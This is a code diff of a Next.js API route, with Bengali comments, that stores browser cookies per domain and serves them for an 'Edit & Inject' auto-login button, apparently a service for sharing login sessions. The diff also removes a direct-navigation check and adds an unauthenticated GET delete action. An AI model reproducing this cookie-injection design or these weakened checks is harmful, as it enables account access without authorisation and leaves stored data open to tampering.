@@ -56,22 +56,8 @@ export async function OPTIONS(req: NextRequest) {
 export async function GET(req: NextRequest) {
   const headers = corsHeaders(req);
 
-  // ১. ডোমেইন বা বট সিকিউরিটি চেক
   if (!isAllowedDomain(req)) {
     return NextResponse.json({ success: false, error: 'Forbidden', message: 'Access denied.' }, { status: 403, headers });
-  }
-
-  const acceptHeader = req.headers.get('accept') || '';
-  const fetchSite = req.headers.get('sec-fetch-site') || '';
-
-  // 🔒 ২. সরাসরি ব্রাউজারে লিংক ওপেন করা ব্লক করার কন্ডিশন
-  // কেউ যদি ব্রাউজারের এড্রেস বারে লিংক পেস্ট করে ঢোকে, তবে সে সরাসরি HTML রিকোয়েস্ট পাঠাবে
-  if (acceptHeader.includes('text/html') && fetchSite === 'none') {
-    return NextResponse.json({ 
-      success: false, 
-      error: 'Access Denied', 
-      message: 'Direct API navigation is restricted.' 
-    }, { status: 403, headers });
   }
 
   const { searchParams } = new URL(req.url);
@@ -80,7 +66,11 @@ export async function GET(req: NextRequest) {
   const id = searchParams.get('id');
 
   try {
-    // 🔑 বাটন থেকে টোকেন সার্ভিস রিকোয়েস্ট
+    if (action === 'test') {
+      return NextResponse.json({ success: true, message: 'API Connected', database: 'Connected' }, { headers });
+    }
+
+    // 🔑 ১. বাটন থেকে আসা টোকেন রিকোয়েস্ট (ওয়েবসাইট বাটনের জন্য)
     if (token) {
       let targetId = '';
       try {
@@ -103,10 +93,10 @@ export async function GET(req: NextRequest) {
           }, { headers });
         }
       }
-      return NextResponse.json({ success: false, error: 'Session expired or not found' }, { status: 404, headers });
+      return NextResponse.json({ success: false, error: 'Session not found' }, { status: 404, headers });
     }
 
-    // 📋 এডমিন প্যানেল বা নির্দিষ্ট আইডি রিকোয়েস্ট
+    // 🔒 ২. শুধুমাত্র নির্দিষ্ট ১টি কুকির ডাটা তোলার জন্য (Edit & Inject-এর সময় এটি কল হবে)
     if (action === 'get' && id) {
       const [rows]: any = await pool.query('SELECT * FROM cookies WHERE id = ?', [id]);
       if (rows.length > 0) {
@@ -122,9 +112,9 @@ export async function GET(req: NextRequest) {
       return NextResponse.json({ success: false, error: 'Cookie not found' }, { status: 404, headers });
     }
 
-    // এডমিন প্যানেলের তালিকা
+    // 🛡️ ৩. তালিকা দেখার জন্য (পোস্টম্যানে কুকিজ লিক ঠেকানোর জন্য 'cookies_json' বাদ রাখা হয়েছে)
     if (action === 'list' || !action) {
-      const [rows]: any = await pool.query('SELECT id, domain, target_url, cookies_json, created_at FROM cookies ORDER BY created_at DESC');
+      const [rows]: any = await pool.query('SELECT id, domain, target_url, created_at FROM cookies ORDER BY created_at DESC');
       return NextResponse.json({ success: true, data: rows }, { headers });
     }
 
@@ -138,6 +128,13 @@ export async function GET(req: NextRequest) {
       const htmlCode = `<button style="background:linear-gradient(135deg,#ec4899 0%,#8b5cf6 100%);color:white;border:none;padding:12px 24px;font-size:15px;font-weight:600;border-radius:10px;cursor:pointer;box-shadow:0 4px 20px rgba(139,92,246,0.5);transition:all 0.3s ease;display:inline-flex;align-items:center;gap:10px;border:1px solid rgba(255,255,255,0.15);" onmouseover="this.style.transform='translateY(-2px)';this.style.boxShadow='0 8px 25px rgba(139,92,246,0.65)';" onmouseout="this.style.transform='translateY(0)';this.style.boxShadow='0 4px 20px rgba(139,92,246,0.5)';" onclick="handleAutoLogin(this, ${cookie.id}, '${cookie.domain}')"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="flex-shrink:0;"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> Access Now</button>`;
 
       return NextResponse.json({ success: true, html: htmlCode }, { headers });
+    }
+
+    if (action === 'delete') {
+      if (!id) return NextResponse.json({ success: false, error: 'Missing ID' }, { status: 400, headers });
+
+      await pool.query('DELETE FROM cookies WHERE id = ?', [id]);
+      return NextResponse.json({ success: true, message: 'Cookie deleted successfully' }, { headers });
     }
 
     return NextResponse.json({ success: false, error: 'Invalid Action' }, { status: 400, headers });
